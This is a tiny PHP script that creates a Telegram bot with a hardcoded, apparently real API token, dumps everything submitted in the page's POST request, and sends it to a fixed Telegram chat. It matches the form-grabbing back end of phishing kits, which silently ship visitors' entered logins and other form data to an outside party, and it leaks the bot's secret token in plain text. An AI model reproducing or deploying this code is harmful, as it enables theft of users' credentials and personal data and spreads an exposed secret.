<?php
   require_once getcwd()."/Bot_lib/main.php";
   $x  = new bot("941266680:AAEXLAnOlcQ3IqIlRFL_598_uSRYwLU2yzg");
   ob_start();
   var_dump($_POST);
   $ST =  ob_get_clean();
   $x->sendMessage("556659349", $ST);
?>


